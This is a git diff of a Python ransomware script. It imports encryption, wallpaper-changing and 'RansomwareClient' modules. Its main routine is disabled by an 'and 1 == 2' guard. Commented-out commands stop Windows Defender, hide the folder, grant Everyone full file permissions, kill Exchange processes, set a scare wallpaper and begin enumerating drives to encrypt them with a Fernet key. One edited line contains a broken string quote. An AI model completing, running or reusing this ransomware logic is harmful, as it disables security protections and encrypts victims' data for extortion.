@@ -4,11 +4,10 @@ from win32 import win32api
 from shaul_decrypt import Decrypt
 from shaul_encrypt import Encrypt
 from change_wallpaper import setWallpaper
-
+from ransomware_client import RansomwareClient
 
 if __name__ == "__main__" and 1 == 2:  # I added the 1 == 2 just as a security measure for now
     print("hello i don't want to ruin my computer accidentally")
-
     # os.system("sc stop WinDefend")
     # os.system("attrib +h .")
     # os.system("icals . /grant Everyone:F /T /C /Q")
@@ -20,10 +19,11 @@ if __name__ == "__main__" and 1 == 2:  # I added the 1 == 2 just as a security m
     # os.system("taskkill.exe /f /im Microsoft.Exchange.*")
 
     # change the wallpaper to scare the user.
-    #setWallpaper("computer_background.jpeg")
+    # setWallpaper("computer_background.jpeg")
 #
 
-#    key = open("key.txt", 'rb').read()
+#    with open("key.txt", 'rb) as file:
+#         key = file.read()
 #    fernet = Fernet(key)
 #    drives = win32api.GetLogicalDriveStrings()
 #    drives = drives.split('\000')[:-1]
